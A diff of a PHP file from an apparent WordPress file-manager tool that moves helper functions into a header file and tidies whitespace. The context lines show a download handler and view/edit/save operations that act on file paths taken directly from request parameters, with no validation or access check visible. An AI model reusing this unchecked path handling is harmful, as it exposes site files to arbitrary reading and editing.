@@ -11,113 +11,13 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-// Helper functions for file operations
-function isEditableFile($file_path)
-{
-    $editable_extensions = ['php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'txt', 'md', 'sql', 'htaccess', 'log', 'ini', 'conf', 'yml', 'yaml'];
-    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    return in_array($extension, $editable_extensions) || basename($file_path) === '.htaccess';
-}
-
-function isImageFile($file_path)
-{
-    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
-    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    return in_array($extension, $image_extensions);
-}
-
-function isBinaryFile($file_path)
-{
-    if (!file_exists($file_path) || !is_file($file_path)) {
-        return false;
-    }
-
-    $binary_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'zip', 'rar', 'tar', 'gz', 'exe', 'dll', 'so', 'dylib'];
-    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-
-    if (in_array($extension, $binary_extensions)) {
-        return true;
-    }
-
-    // Check file content for binary data
-    $handle = fopen($file_path, 'rb');
-    $chunk = fread($handle, 1024);
-    fclose($handle);
-
-    return strpos($chunk, "\0") !== false;
-}
-
-function getSyntaxClass($file_path)
-{
-    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    $syntax_map = [
-        'php' => 'php',
-        'html' => 'html',
-        'htm' => 'html',
-        'css' => 'css',
-        'js' => 'javascript',
-        'json' => 'json',
-        'xml' => 'xml',
-        'sql' => 'sql',
-        'md' => 'markdown'
-    ];
-    return isset($syntax_map[$extension]) ? $syntax_map[$extension] : 'text';
-}
-
-function getFileIcon($file_path)
-{
-    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
-    $icon_map = [
-        'pdf' => '📄',
-        'doc' => '📝',
-        'docx' => '📝',
-        'xls' => '📊',
-        'xlsx' => '📊',
-        'ppt' => '📽️',
-        'pptx' => '📽️',
-        'zip' => '🗜️',
-        'rar' => '🗜️',
-        'tar' => '🗜️',
-        'gz' => '🗜️',
-        'mp3' => '🎵',
-        'wav' => '🎵',
-        'flac' => '🎵',
-        'mp4' => '🎬',
-        'avi' => '🎬',
-        'mov' => '🎬',
-        'mkv' => '🎬',
-        'jpg' => '🖼️',
-        'jpeg' => '🖼️',
-        'png' => '🖼️',
-        'gif' => '🖼️',
-        'bmp' => '🖼️',
-        'webp' => '🖼️',
-        'exe' => '⚙️',
-        'msi' => '⚙️',
-        'sql' => '🗃️',
-        'php' => '🐘',
-        'js' => '📜',
-        'css' => '🎨',
-        'html' => '🌐'
-    ];
-    return isset($icon_map[$extension]) ? $icon_map[$extension] : '📄';
-}
-
-if (!function_exists('normalizePath')) {
-    function normalizePath($path)
-    {
-        if (DIRECTORY_SEPARATOR === '\\') {
-            $path = str_replace('/', '\\', $path);
-        }
-        return $path;
-    }
-}
+// Helper functions for file operations are loaded from wp-arzo-header.php
 
 
 // Handle file download
 if (isset($_GET['download'])) {
     $file_path = normalizePath($_GET['download']);
-    
+
     if (file_exists($file_path) && is_file($file_path)) {
         // Clean any output buffers
         while (ob_get_level()) {
@@ -150,7 +50,7 @@ if (isset($_GET['download'])) {
 // Handle AJAX operations for files
 if (isset($_GET['operation'])) {
     $operation = $_GET['operation'];
-    
+
     if (in_array($operation, ['view_file', 'edit_file', 'save_file'])) {
         header('Content-Type: application/json');
         $response = ['success' => false, 'message' => 'Unknown operation'];
@@ -216,7 +116,7 @@ if (isset($_GET['operation'])) {
                     if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                         $filename = basename($file_path);
                         $file_content = file_get_contents($file_path);
-                        
+
                         $file_size = filesize($file_path);
                         $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                         $modified = date('Y-m-d H:i:s', filemtime($file_path));
@@ -332,7 +232,8 @@ function handleFiles()
 
                 $files = scandir($current_dir);
                 foreach ($files as $file) {
-                    if ($file === '.' || $file === '..') continue;
+                    if ($file === '.' || $file === '..')
+                        continue;
 
                     $file_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file;
                     $is_dir = is_dir($file_path);
@@ -394,7 +295,7 @@ function handleFiles()
         </div>
 
     </div>
-<?php
+    <?php
 }
 
 // Call the function
